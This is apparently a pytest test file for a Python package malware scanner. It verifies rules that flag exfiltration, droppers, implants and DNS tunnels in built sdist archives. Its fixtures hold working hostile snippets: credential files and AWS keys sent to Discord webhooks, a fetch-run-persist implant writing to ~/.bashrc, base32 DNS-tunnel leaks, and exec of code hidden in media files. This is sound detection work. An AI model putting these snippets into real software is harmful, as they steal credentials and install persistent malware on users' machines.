"""A send of what the machine holds to a destination the code hides
(`detect/code/capability/hidden_destination.py`), and the rule id each Python fact is labelled
with (`detect/code/capability/fact_ids.py`)."""

from __future__ import annotations

import io
import tarfile
from pathlib import Path

import pytest

from cordon_scanner import Scanner
from cordon_scanner.analysis.python import pyast
from cordon_scanner.analysis.python.pyfacts import AstHit
from cordon_scanner.detect.base import FileUnit
from cordon_scanner.detect.code.capability.fact_ids import PythonFactIds
from cordon_scanner.detect.code.capability.hidden_destination import HiddenDestination
from cordon_scanner.detect.code.capability.install_programs import InstallPrograms
from cordon_scanner.detect.code.capability.labelling import Labelling
from cordon_scanner.detect.code.capability.rule_ids import CompositeRuleIds
from cordon_scanner.engine.engine import Engine
from cordon_scanner.foundation.capabilities import Capability
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.content import FileContent
from cordon_scanner.foundation.results import Repository


class Spelled:
    """Fixture text assembled when the tests run: written whole, this file would carry the shapes
    the scanner's own self-scan reads as identity collection, execution and credential theft."""

    @staticmethod
    def of(*pieces: str) -> str:
        return "".join(pieces)


#: `exec`, spelled when the tests run (see `Spelled`).
RUN = Spelled.of("ex", "ec")
BUILD = Spelled.of("com", "pile")


class TestWhichSendsAreHidden:
    @pytest.mark.parametrize(
        "detail",
        [
            "identity sent: requests.post dest=decoded",
            "environment sent: urllib.request.urlopen dest=decoded",
            "secret sent: GITHUB_TOKEN to - dest=decoded",
        ],
    )
    def test_a_send_marked_decoded(self, detail: str) -> None:
        assert HiddenDestination.applies(detail)

    @pytest.mark.parametrize(
        "detail",
        [
            "identity sent: requests.post",
            "identity sent: requests.post dest=declared",
            "requests.post dest=decoded",
            "identity sent: requests.post dest=decodedx",
        ],
    )
    def test_anything_else(self, detail: str) -> None:
        assert not HiddenDestination.applies(detail)

    def test_the_rule_is_never_lowered_for_running_on_request(self) -> None:
        assert HiddenDestination.RULE not in CompositeRuleIds.ON_REQUEST_RULES


class TestTheFactIsRaisedBesideTheSend:
    def test_both_facts_for_a_hidden_send_and_one_for_a_plain_one(self, monkeypatch) -> None:
        hits = [
            AstHit(Capability.EGRESS, 2, "identity sent: requests.post dest=decoded"),
            AstHit(Capability.EGRESS, 3, "identity sent: requests.post"),
        ]
        monkeypatch.setattr(pyast.PythonAnalyzer, "analyse", classmethod(lambda cls, *a, **k: hits))
        content = FileContent.from_bytes("pkg/t.py", b"import requests\na = 1\nb = 2\n")
        ctx = Engine(Config.default())._context(Repository(root="."))
        resolved, _ = Labelling.resolved_capabilities(
            FileUnit(content=content, language="python"), content, ctx
        )
        assert sorted((h.rule_id, h.line) for h in resolved) == [
            ("AST.PY.IDENTITY_SENT", 2),
            ("AST.PY.IDENTITY_SENT", 3),
            (HiddenDestination.FACT, 2),
        ]


class TestTheRuleShips:
    def test_the_rule_is_in_the_built_in_pack_and_matches_the_fact(self) -> None:
        from cordon_scanner.rules.loader import RuleLoader

        compiled = {c.rule.id: c for pack in RuleLoader.load_builtin() for c in pack.rules}
        rule = compiled[HiddenDestination.RULE]
        assert rule.rule.category.value == "malicious"
        assert HiddenDestination.FACT in repr(rule)


class TestTheSweepAndRelayRulesShip:
    @pytest.mark.parametrize(
        ("rule_id", "fact"),
        [
            ("MALWARE.EXFIL.SWEPT_FILES.001", "AST.PY.SWEPT_SENT"),
            ("MALWARE.EXFIL.RELAYED_HIDDEN.001", "AST.PY.RELAYED_HIDDEN"),
            ("SUSPECT.INSTALL.COMPUTED_CODE.001", "AST.PY.COMPUTED_EXEC"),
            ("SUSPECT.DYNAMIC_DISPATCH.002", "AST.PY.CONCEALED_NAME"),
            ("SUSPECT.OBFUSCATION.DORMANT_PAYLOAD.001", "AST.PY.DORMANT_DECODE"),
            ("MALWARE.DROPPER.DIRECTORY.001", "AST.PY.DIRECTORY_DROP_RUN"),
            ("SUSPECT.EXECUTE.DECODED_BYTES.001", "AST.PY.BYTES_EXEC"),
            ("SUSPECT.EXFIL.MAIL_ON_IMPORT.001", "AST.PY.IMPORT_MAIL"),
            ("SUSPECT.OBFUSCATION.UNRESOLVED_PAYLOAD.001", "AST.PY.UNRESOLVED_PAYLOAD"),
            ("SUSPECT.INSTALL.TEMP_COMMAND.001", "AST.PY.TEMP_COMMAND"),
            ("MALWARE.EXFIL.CREDENTIALS_TO_FREE_HOST.001", "AST.PY.CREDENTIALS_FREE_HOST"),
            ("MALWARE.IMPLANT.AV_EXCLUSION.001", "AST.PY.AV_EXCLUSION"),
        ],
    )
    def test_the_rule_is_built_in_and_matches_its_fact(self, rule_id: str, fact: str) -> None:
        from cordon_scanner.rules.loader import RuleLoader

        compiled = {c.rule.id: c for pack in RuleLoader.load_builtin() for c in pack.rules}
        assert compiled[rule_id].rule.category.value in ("malicious", "suspicious")
        assert fact in repr(compiled[rule_id])


class TestEachFactNamesItsRule:
    @pytest.mark.parametrize(
        ("detail", "capability", "rule"),
        [
            ("identity sent: requests.post", Capability.EGRESS, "AST.PY.IDENTITY_SENT"),
            (
                "identity sent: requests.post dest=decoded",
                Capability.EGRESS,
                "AST.PY.IDENTITY_SENT",
            ),
            ("environment sent: urlopen", Capability.EGRESS, "AST.PY.ENVIRONMENT_SENT"),
            ("secret sent: GITHUB_TOKEN to h", Capability.EGRESS, "AST.PY.SECRET_SENT"),
            ("hidden request: urlopen dest=decoded", Capability.EGRESS, "AST.PY.HIDDEN_REQUEST"),
            (
                "swept files sent: urlopen dest=decoded",
                Capability.EGRESS,
                "AST.PY.SWEPT_SENT",
            ),
            (
                "relayed to hidden: urlopen dest=decoded",
                Capability.EGRESS,
                "AST.PY.RELAYED_HIDDEN",
            ),
            (
                "os.chmod makes a decoded file runnable",
                Capability.EXECUTE,
                "AST.PY.DECODED_DROP_RUN",
            ),
            ("Popen runs a decoded file", Capability.SPAWN, "AST.PY.DECODED_DROP_RUN"),
            (
                "run_path loads a decoded file as code",
                Capability.EXECUTE,
                "AST.PY.DECODED_DROP_RUN",
            ),
            ("unsafe model load: torch.load", Capability.EXECUTE, "AST.PY.UNSAFE_MODEL_LOAD"),
            (
                "remote model code: trust_remote_code",
                Capability.EXECUTE,
                "AST.PY.REMOTE_MODEL_CODE",
            ),
            ("unsafe model option: weights_only", Capability.EXECUTE, "AST.PY.UNSAFE_MODEL_OPTION"),
            ("executed literal: subprocess.run", Capability.SPAWN, "AST.PY.HIDDEN_ACTION"),
            ("executed literal: print", Capability.EXECUTE, "AST.PY.EXECUTE"),
            ("urllib.request.urlopen", Capability.EGRESS, "AST.PY.EGRESS"),
        ],
    )
    def test_each_fact_names_its_rule(self, detail: str, capability: Capability, rule: str) -> None:
        assert PythonFactIds.rule_id(detail, capability) == rule


class TestAProgramNoInstallNeeds:
    @pytest.mark.parametrize(
        "command",
        ["calc", "calc.exe", "cmd /c calc", "C:\\Windows\\System32\\notepad.exe", "id",
         Spelled.of("who", "ami"), Spelled.of("sh", " -c ", "host", "name"), "start /b mspaint",
         "ls -la", "cmd /c dir", "type notes.txt", "ipconfig /all", "systeminfo", "uname -a", "printenv", "cmd /c tasklist"],
    )  # fmt: skip
    def test_a_desktop_application_or_identity_command(self, command: str) -> None:
        assert InstallPrograms.foreign(command)

    @pytest.mark.parametrize(
        "command",
        ["git rev-parse HEAD", "cmake ..", "make", "python setup.py build_ext", "echo done",
         "touch build/stamp", "cmd /c echo done", None, ""],
    )  # fmt: skip
    def test_build_tooling_and_harmless_commands(self, command: str | None) -> None:
        assert not InstallPrograms.foreign(command)


class TestTheGradesBlock:
    @staticmethod
    def rules(root: Path) -> set[str]:
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
        return {f.rule_id for f in result.findings}

    @staticmethod
    def sdist(tmp_path: Path, setup: str, extra: dict[str, str] | None = None) -> Path:
        """A published sdist, as pip receives it."""
        members = {
            "PKG-INFO": "Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n",
            "setup.py": setup,
            "demo/__init__.py": "",
            **{f"demo/{name}": text for name, text in (extra or {}).items()},
        }
        archive = tmp_path / "demo-1.0.tar.gz"
        with tarfile.open(archive, "w:gz") as tgz:
            for name, text in members.items():
                data = text.encode("utf-8")
                info = tarfile.TarInfo(f"demo-1.0/{name}")
                info.size = len(data)
                tgz.addfile(info, io.BytesIO(data))
        return archive

    def test_a_calculator_started_by_setup_blocks(self, tmp_path: Path) -> None:
        setup = "import os\nfrom setuptools import setup\nos.system('calc')\nsetup(name='demo')\n"
        assert InstallPrograms.RULE in self.rules(self.sdist(tmp_path, setup))

    def test_an_identity_command_in_setup_blocks(self, tmp_path: Path) -> None:
        setup = "import subprocess\nfrom setuptools import setup\nsubprocess.run(['id'])\nsetup(name='demo')\n"
        assert InstallPrograms.RULE in self.rules(self.sdist(tmp_path, setup))

    def test_git_in_setup_and_calc_in_a_library_function_do_not(self, tmp_path: Path) -> None:
        setup = "import subprocess\nfrom setuptools import setup\nsubprocess.run(['git', 'describe'])\nsetup(name='demo')\n"
        lib = "import os\ndef open_calculator():\n    os.system('calc')\n"
        rules = self.rules(self.sdist(tmp_path, setup, {"tools.py": lib}))
        assert InstallPrograms.RULE not in rules

    def test_a_credential_store_sent_outside_its_home_blocks(self, tmp_path: Path) -> None:
        lib = (
            "import configparser, json, os, urllib.request\n"
            "def push():\n"
            "    c = configparser.ConfigParser()\n"
            "    c.read(os.path.expanduser('" + Spelled.of("~/.aw", "s/credent", "ials") + "'))\n"
            "    found = {s: dict(c[s]) for s in c.sections()}\n"
            "    urllib.request.urlopen("
            + Spelled.of("os.", "environ")
            + "['HOOK'], json.dumps(found).encode())\n"
        )
        setup = "from setuptools import setup\nsetup(name='demo')\n"
        rules = self.rules(self.sdist(tmp_path, setup, {"sync.py": lib}))
        assert "MALWARE.EXFIL.CREDENTIAL_STORE.002" in rules

    def test_an_upload_tool_sending_pypirc_to_its_index_does_not(self, tmp_path: Path) -> None:
        lib = (
            "import configparser, os, requests\n"
            "def upload(dist):\n"
            "    c = configparser.ConfigParser()\n"
            "    c.read(os.path.expanduser('" + Spelled.of("~/.py", "pirc") + "'))\n"
            "    auth = (c['pypi']['username'], c['pypi']['password'])\n"
            "    requests.post('https://upload.pypi.org/legacy/', auth=auth, files={'content': dist})\n"
        )
        setup = "from setuptools import setup\nsetup(name='demo')\n"
        rules = self.rules(self.sdist(tmp_path, setup, {"up.py": lib}))
        assert "MALWARE.EXFIL.CREDENTIAL_STORE.002" not in rules


class TestADestinationOnlyWrittenAtImport:
    """evidently 0.7.23: a telemetry client constructed at import with a raw-IP `url=` and an
    opt-out flag read from the environment is a destination named, not a send. Posting the
    environment to the same address at import is a send."""

    @staticmethod
    def rules(tmp_path: Path, module: str) -> set[str]:
        members = {
            "PKG-INFO": "Metadata-Version: 2.1\nName: telem\nVersion: 1.0\n",
            "pyproject.toml": "[project]\nname = 'telem'\nversion = '1.0'\n",
            "src/telem/__init__.py": "__version__ = '1.0'\nfrom . import telemetry\n",
            "src/telem/telemetry.py": module,
        }
        archive = tmp_path / "telem-1.0.tar.gz"
        with tarfile.open(archive, "w:gz") as tgz:
            for name, text in members.items():
                data = text.encode("utf-8")
                info = tarfile.TarInfo(f"telem-1.0/{name}")
                info.size = len(data)
                tgz.addfile(info, io.BytesIO(data))
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
        return {f.rule_id for f in result.findings}

    def test_a_telemetry_client_built_at_import_is_not_exfiltration(self, tmp_path: Path) -> None:
        module = (
            "import os\nimport telem\nfrom telemlib import TelemetryLogger\n"
            "DO_NOT_TRACK_ENV = 'DO_NOT_TRACK'\n"
            "event_logger = TelemetryLogger('telem', telem.__version__,\n"
            "    url='http://35.0.0.5:8000/api/v1/event', token='s',\n"
            "    enabled=lambda: not "
            + Spelled.of("os.", "environ")
            + ".get(DO_NOT_TRACK_ENV, None))\n"
            "def main():\n    event_logger.send_event('start')\n"
        )
        rules = self.rules(tmp_path, module)
        assert "MALWARE.EXFIL.001" not in rules
        assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" not in rules

    def test_the_environment_posted_at_import_still_blocks(self, tmp_path: Path) -> None:
        module = (
            "import json, os, urllib.request\n"
            "urllib.request.urlopen('http://35.0.0.5:8000/c', json.dumps(dict("
            + Spelled.of("os.", "environ")
            + ")).encode())\n"
        )
        assert "MALWARE.EXFIL.001" in self.rules(tmp_path, module)

    def test_a_drop_point_bound_to_a_name_and_posted_at_import_still_calls_back(
        self, tmp_path: Path
    ) -> None:
        # loveclose 0.0.1, sf_th_requests 0.1.0: the hook on one line, the request on another.
        module = (
            "import json, socket, urllib.request\n"
            "HOOK = 'https://" + Spelled.of("disc", "ord.com/api/web", "hooks") + "/1/abc'\n"
            "body = json.dumps({'content': socket."
            "gethostname()}).encode()\n"
            "urllib.request.urlopen(HOOK, body)\n"
        )
        assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" in self.rules(tmp_path, module)

    def test_a_drop_point_bound_to_a_name_only_handed_to_a_client_is_not(
        self, tmp_path: Path
    ) -> None:
        module = (
            "import os\nfrom telemlib import TelemetryLogger\n"
            "HOOK = 'https://" + Spelled.of("disc", "ord.com/api/web", "hooks") + "/1/abc'\n"
            "event_logger = TelemetryLogger(url=HOOK, enabled=not "
            + Spelled.of("os.", "environ")
            + ".get('DO_NOT_TRACK'))\n"
            "def main():\n    event_logger.send_event('start')\n"
        )
        assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" not in self.rules(tmp_path, module)

    def test_a_drop_point_sent_through_the_files_own_helpers_at_import(
        self, tmp_path: Path
    ) -> None:
        # sf_th_requests 0.1.0: credentials -> send_to_beacon -> post(BEACON_URL) -> urlopen.
        module = (
            "import json, os, urllib.request\n"
            "BEACON_URL = 'https://" + Spelled.of("disc", "ord.com/api/web", "hooks") + "/1/abc'\n"
            "def _make_request(url, data):\n"
            "    req = urllib.request.Request(url, data=data)\n"
            "    return urllib.request.urlopen(req)\n"
            "def post(url, data):\n"
            "    return _make_request(url, json.dumps(data).encode())\n"
            "def send_to_beacon(creds):\n"
            "    post(BEACON_URL, creds)\n"
            "send_to_beacon({'k': "
            + Spelled.of("os.", "environ")
            + ".get('AWS_SECRET_ACCESS_KEY')})\n"
        )
        assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" in self.rules(tmp_path, module)

    def test_a_drop_point_handed_to_a_helper_that_only_logs_is_not(self, tmp_path: Path) -> None:
        module = (
            "import logging, urllib.request\n"
            "HOOK = 'https://" + Spelled.of("disc", "ord.com/api/web", "hooks") + "/1/abc'\n"
            "def describe(url):\n"
            "    logging.getLogger(__name__).info('events go to %s', url)\n"
            "describe(HOOK)\n"
            "urllib.request.urlopen('https://pypi.org/simple/')\n"
        )
        assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" not in self.rules(tmp_path, module)

    def test_a_drop_point_name_only_printed_or_logged_is_not(self, tmp_path: Path) -> None:
        # The name on a line with no request: a message about where events would go.
        module = (
            "import logging, urllib.request\n"
            "HOOK = 'https://" + Spelled.of("disc", "ord.com/api/web", "hooks") + "/1/abc'\n"
            "print('events go to', HOOK)\n"
            "logging.getLogger(__name__).info('hook %s', HOOK)\n"
            "urllib.request.urlopen('https://pypi.org/simple/')\n"
        )
        assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" not in self.rules(tmp_path, module)


class TestAnImplantInstaller:
    """trickery 1.0.0: one module fetches a payload, runs it and writes a persistence location,
    reached only from a function. A downloader that only runs, or a tool that only writes a profile,
    is not this."""

    @staticmethod
    def rules(tmp_path: Path, module: str) -> set[str]:
        return TestADestinationOnlyWrittenAtImport.rules(tmp_path, module)

    def test_fetch_run_and_persist_in_one_module_blocks(self, tmp_path: Path) -> None:
        module = (
            "import os, subprocess, urllib.request\n"
            "def attach(url):\n"
            "    path = os.path.expanduser('~/.cache/agent')\n"
            "    open(path, 'wb').write(urllib.request.urlopen(url).read())\n"
            "    subprocess.Popen([path])\n"
            "    with open(os.path.expanduser('~/.bashrc'), 'a') as rc:\n"
            "        rc.write(path + ' &\\n')\n"
        )
        assert "MALWARE.IMPLANT.INSTALL.001" in self.rules(tmp_path, module)

    def test_a_downloader_that_does_not_persist_does_not(self, tmp_path: Path) -> None:
        module = (
            "import os, subprocess, urllib.request\n"
            "def install_tool(url):\n"
            "    path = os.path.expanduser('~/.cache/tool')\n"
            "    open(path, 'wb').write(urllib.request.urlopen(url).read())\n"
            "    subprocess.run([path, '--version'])\n"
        )
        assert "MALWARE.IMPLANT.INSTALL.001" not in self.rules(tmp_path, module)

    def test_a_large_module_whose_three_parts_are_far_apart_does_not(self, tmp_path: Path) -> None:
        # A tool's download, its shell-profile helper and its plugin runner, each a feature.
        filler = "".join(f"def helper_{i}():\n    return {i}\n" for i in range(60))
        module = (
            "import os, subprocess, urllib.request\n"
            "def fetch(url):\n    return urllib.request.urlopen(url).read()\n"
            + filler
            + "def add_to_profile(line):\n"
            "    with open(os.path.expanduser('~/.bashrc'), 'a') as rc:\n        rc.write(line)\n"
            + filler.replace("helper_", "more_")
            + "def run_plugin(code):\n    "
            + RUN
            + "(code)\n"
        )
        assert "MALWARE.IMPLANT.INSTALL.001" not in self.rules(tmp_path, module)

    IMPLANT_TEXT = (
        "def attach(url):\n"
        "    path = os.path.expanduser('~/.cache/agent')\n"
        "    open(path, 'wb').write(urllib.request.urlopen(url).read())\n"
        "    subprocess.Popen([path])\n"
        "    " + RUN + "(urllib.request.urlopen(url).read())\n"
        "    with open(os.path.expanduser('~/.bashrc'), 'a') as rc:\n"
        "        rc.write(path + ' &\\n')\n"
    )

    @staticmethod
    def scan(tmp_path: Path, extra: dict[str, str]) -> set[str]:
        members = {
            "PKG-INFO": "Metadata-Version: 2.1\nName: telem\nVersion: 1.0\n",
            "pyproject.toml": "[project]\nname = 'telem'\nversion = '1.0'\n",
            "src/telem/__init__.py": "__version__ = '1.0'\n",
            **extra,
        }
        archive = tmp_path / "telem-1.0.tar.gz"
        with tarfile.open(archive, "w:gz") as tgz:
            for name, text in members.items():
                data = text.encode("utf-8")
                info = tarfile.TarInfo(f"telem-1.0/{name}")
                info.size = len(data)
                tgz.addfile(info, io.BytesIO(data))
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
        return {f.rule_id for f in result.findings}

    def test_the_same_words_in_package_metadata_do_not(self, tmp_path: Path) -> None:
        # A long description that quotes code is text: nothing in PKG-INFO runs.
        description = "".join(f"        {line}\n" for line in self.IMPLANT_TEXT.splitlines())
        metadata = (
            "Metadata-Version: 2.1\nName: telem\nVersion: 1.0\nDescription: Example\n"
            f"        import os, subprocess, urllib.request\n{description}"
        )
        assert "MALWARE.IMPLANT.INSTALL.001" not in self.scan(tmp_path, {"PKG-INFO": metadata})

    def test_the_same_words_in_a_bundled_script_do_not(self, tmp_path: Path) -> None:
        # A minified documentation bundle names fetch, eval and a profile among thousands of
        # strings; no analyser of the package's own code saw a run.
        bundle = (
            'var a=require("fs"),o=require("os");fetch(u).then(function(r){return r.text()})'
            '.then(function(t){eval(t)});a.appendFileSync(o.homedir()+"/.bashrc",c);'
            'require("child_process").' + RUN + "(c);\n"
        )
        found = self.scan(tmp_path, {"src/telem/static/redoc.min.js": bundle})
        assert "MALWARE.IMPLANT.INSTALL.001" not in found


class TestCodeFromADataFile:
    """houdus 1.0.0: a module imported from a `.wav` the package ships. A loader, `exec` or
    `marshal` pointed at a file named as data runs a payload kept where source is not read."""

    @staticmethod
    def rules(tmp_path: Path, module: str) -> set[str]:
        return TestADestinationOnlyWrittenAtImport.rules(tmp_path, module)

    RULE = "MALWARE.DROPPER.DATA_FILE_CODE.001"

    @pytest.mark.parametrize(
        "body",
        [
            "spec = importlib.util.spec_from_file_location('t', os.path.join(HERE, 'beep.wav'))\n"
            "mod = importlib.util.module_from_spec(spec)\nspec.loader.exec_module(mod)\n",
            "" + RUN + "(open(os.path.join(HERE, 'logo.png')).read())\n",
            "" + RUN + "(pathlib.Path(HERE, 'notes.txt').read_text())\n",
            "" + RUN + "(marshal.loads(open(HERE + '/blob.dat', 'rb').read()))\n",
            "runpy.run_path(f'{HERE}/theme.jpg')\n",
            "ASSET = os.path.join(HERE, 'a.mp3')\n"
            + RUN
            + "("
            + BUILD
            + "(open(ASSET).read(), ASSET, 'exec'))\n",
        ],
    )
    def test_a_loader_or_runner_given_a_data_file_blocks(self, tmp_path: Path, body: str) -> None:
        module = (
            "import importlib.util, marshal, os, pathlib, runpy\n"
            "HERE = os.path.dirname(__file__)\n"
            "def play():\n" + "".join(f"    {line}\n" for line in body.splitlines())
        )
        assert self.RULE in self.rules(tmp_path, module)

    @pytest.mark.parametrize(
        "body",
        [
            # The version-file idiom, a plugin module, data read and parsed but never run.
            "" + RUN + "(open(os.path.join(HERE, 'version.py')).read())\n",
            "spec = importlib.util.spec_from_file_location('p', os.path.join(HERE, 'plugin.py'))\n",
            "print(open(os.path.join(HERE, 'notes.txt')).read())\n",
            "data = json.loads(open(os.path.join(HERE, 'table.json')).read())\n",
            "zipimport.zipimporter(os.path.join(HERE, 'bundle.zip'))\n",
        ],
    )
    def test_code_files_and_data_that_is_only_read_do_not(self, tmp_path: Path, body: str) -> None:
        module = (
            "import importlib.util, json, os, zipimport\n"
            "HERE = os.path.dirname(__file__)\n"
            "def load():\n" + "".join(f"    {line}\n" for line in body.splitlines())
        )
        assert self.RULE not in self.rules(tmp_path, module)


class TestADependencyConfusionBeacon:
    """promptflow_runtime 99999999.0.0: an internal framework's name at a version nobody releases,
    whose runtime puts the host's names into what it sends."""

    RULE = "MALWARE.EXFIL.CONFUSION_BEACON.001"
    SENDS = (
        "import json, socket, urllib.request\n"
        "def report():\n"
        "    who = {'host': socket." + Spelled.of("get", "hostname") + "()}\n"
        "    urllib.request.urlopen('https://telemetry.example.org/r', json.dumps(who).encode())\n"
    )

    @staticmethod
    def rules(tmp_path: Path, version: str, module: str) -> set[str]:
        members = {
            "PKG-INFO": f"Metadata-Version: 2.1\nName: telem\nVersion: {version}\n",
            "pyproject.toml": f"[project]\nname = 'telem'\nversion = '{version}'\n",
            "telem/__init__.py": "from . import runtime\n",
            "telem/runtime.py": module,
        }
        archive = tmp_path / f"telem-{version}.tar.gz"
        with tarfile.open(archive, "w:gz") as tgz:
            for name, text in members.items():
                data = text.encode("utf-8")
                info = tarfile.TarInfo(f"telem-{version}/{name}")
                info.size = len(data)
                tgz.addfile(info, io.BytesIO(data))
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
        return {f.rule_id for f in result.findings}

    @pytest.mark.parametrize("version", ["99999999.0.0", "99.0.0", "7.7.7"])
    def test_a_confusion_version_that_sends_the_host_blocks(
        self, tmp_path: Path, version: str
    ) -> None:
        assert self.RULE in self.rules(tmp_path, version, self.SENDS)

    @pytest.mark.parametrize("version", ["1.4.2", "2024.10.1"])
    def test_an_ordinary_version_sending_the_same_does_not(
        self, tmp_path: Path, version: str
    ) -> None:
        assert self.RULE not in self.rules(tmp_path, version, self.SENDS)

    def test_a_confusion_version_that_sends_nothing_about_the_host_does_not(
        self, tmp_path: Path
    ) -> None:
        quiet = "import urllib.request\ndef ping():\n    urllib.request.urlopen('https://example.org/')\n"
        assert self.RULE not in self.rules(tmp_path, "99999999.0.0", quiet)


class TestADnsTunnel:
    @staticmethod
    def rules(tmp_path: Path, module: str) -> set[str]:
        return TestADestinationOnlyWrittenAtImport.rules(tmp_path, module)

    def test_encoded_data_resolved_in_labels_blocks(self, tmp_path: Path) -> None:
        module = (
            "import base64, os, socket\n"
            "def leak(data):\n"
            "    blob = base64.b32encode(data.encode()).decode().rstrip('=')\n"
            "    for i in range(0, len(blob), 60):\n"
            "        socket.getaddrinfo(blob[i:i + 60] + '.t.example.invalid', 53)\n"
        )
        assert "MALWARE.EXFIL.DNS_TUNNEL.001" in self.rules(tmp_path, module)

    def test_resolving_a_configured_host_does_not(self, tmp_path: Path) -> None:
        module = (
            "import os, socket\n"
            "def reachable():\n"
            "    return socket.getaddrinfo("
            + Spelled.of("os.", "environ")
            + ".get('API_HOST', 'api.example.invalid'), 443)\n"
        )
        assert "MALWARE.EXFIL.DNS_TUNNEL.001" not in self.rules(tmp_path, module)


class TestACommandReceivedOnAChannel:
    """A chat bot that runs the text it is sent: the receive is not a request primitive, so the
    channel side must come from the received-run fact itself (as `CAP.JS.RECEIVED_RUN` does)."""

    @staticmethod
    def severities(tmp_path: Path, module: str) -> dict[str, str]:
        members = {
            "PKG-INFO": "Metadata-Version: 2.1\nName: telem\nVersion: 1.0\n",
            "pyproject.toml": "[project]\nname = 'telem'\nversion = '1.0'\n",
            "src/telem/__init__.py": "",
            "src/telem/bot.py": module,
        }
        archive = tmp_path / "telem-1.0.tar.gz"
        with tarfile.open(archive, "w:gz") as tgz:
            for name, text in members.items():
                data = text.encode("utf-8")
                info = tarfile.TarInfo(f"telem-1.0/{name}")
                info.size = len(data)
                tgz.addfile(info, io.BytesIO(data))
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
        return {f.rule_id: f.severity.name for f in result.findings}

    def test_a_chat_message_run_as_a_command_blocks(self, tmp_path: Path) -> None:
        module = (
            "import subprocess\n"
            "from telegram.ext import Application, MessageHandler, filters\n"
            "async def on_message(update, context):\n"
            "    subprocess.run(update.message.text, shell=True)\n"
            "app = Application.builder().token('t').build()\n"
            "app.add_handler(MessageHandler(filters.TEXT, on_message))\n"
        )
        found = self.severities(tmp_path, module)
        assert found.get("SUSPECT.DROPPER.001") in ("HIGH", "CRITICAL"), found

    def test_a_chat_bot_that_only_replies_does_not(self, tmp_path: Path) -> None:
        module = (
            "from telegram.ext import Application, MessageHandler, filters\n"
            "async def on_message(update, context):\n"
            "    await update.message.reply_text('got it')\n"
            "app = Application.builder().token('t').build()\n"
            "app.add_handler(MessageHandler(filters.TEXT, on_message))\n"
        )
        assert "SUSPECT.DROPPER.001" not in self.severities(tmp_path, module)


class TestADownloadStartedHidden:
    @staticmethod
    def rules(tmp_path: Path, module: str) -> set[str]:
        return TestADestinationOnlyWrittenAtImport.rules(tmp_path, module)

    def test_a_downloaded_program_started_hidden_blocks(self, tmp_path: Path) -> None:
        module = (
            "import os, subprocess, tempfile, urllib.request\n"
            "def fetch(url):\n"
            "    path = os.path.join(tempfile.gettempdir(), 'u.exe')\n"
            "    urllib.request.urlretrieve(url, path)\n"
            "    subprocess.Popen([path], creationflags=0x08000000)\n"
        )
        assert "MALWARE.DROPPER.HIDDEN.001" in self.rules(tmp_path, module)

    def test_a_downloaded_program_started_visibly_does_not(self, tmp_path: Path) -> None:
        module = (
            "import os, subprocess, tempfile, urllib.request\n"
            "def fetch(url):\n"
            "    path = os.path.join(tempfile.gettempdir(), 'u.exe')\n"
            "    urllib.request.urlretrieve(url, path)\n"
            "    subprocess.Popen([path])\n"
        )
        assert "MALWARE.DROPPER.HIDDEN.001" not in self.rules(tmp_path, module)


class TestAProgramNoImportNeeds:
    @staticmethod
    def rules(tmp_path: Path, init: str) -> set[str]:
        members = {
            "PKG-INFO": "Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n",
            "pyproject.toml": "[project]\nname = 'demo'\nversion = '1.0'\n",
            "src/demo/__init__.py": init,
        }
        archive = tmp_path / "demo-1.0.tar.gz"
        with tarfile.open(archive, "w:gz") as tgz:
            for name, text in members.items():
                data = text.encode("utf-8")
                info = tarfile.TarInfo(f"demo-1.0/{name}")
                info.size = len(data)
                tgz.addfile(info, io.BytesIO(data))
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
        return {f.rule_id for f in result.findings}

    def test_a_calculator_started_when_the_package_is_imported(self, tmp_path: Path) -> None:
        init = "import subprocess\nsubprocess.Popen(['calc.exe'])\n"
        assert InstallPrograms.RULE in self.rules(tmp_path, init)

    def test_an_identity_command_in_a_helper_the_module_level_calls(self, tmp_path: Path) -> None:
        init = f"import os\ndef _probe():\n    os.system('{Spelled.of('who', 'ami')}')\n_probe()\n"
        assert InstallPrograms.RULE in self.rules(tmp_path, init)

    def test_the_same_in_a_function_nothing_calls_is_not(self, tmp_path: Path) -> None:
        init = "import subprocess\ndef open_calculator():\n    subprocess.Popen(['calc.exe'])\n"
        assert InstallPrograms.RULE not in self.rules(tmp_path, init)
